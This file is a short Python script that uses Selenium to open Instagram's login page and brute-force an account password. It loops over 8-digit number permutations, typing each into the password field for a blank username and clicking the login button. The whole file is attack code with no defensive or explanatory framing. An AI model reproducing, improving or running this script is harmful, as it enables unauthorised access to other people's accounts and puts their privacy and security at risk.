from itertools import permutations
from selenium import webdriver

numbers = '0123456789'

def get():
    global chrome
    # starts a new chrome session
    chrome = webdriver.Chrome('chromedriver') # Add path if required
    chrome.get('https://www.instagram.com/')

def login():
    predictions = permutations(numbers, 8)
    userName = ''
    for prediction in predictions:
        usern = chrome.find_element_by_name('username')
        usern.send_keys(userName)
        passw = chrome.find_element_by_name('password')
        passw.send_keys(''.join(prediction))
        notk = chrome.find_element_by_class_name('L3NKy')
        notk.click()

get()
login()
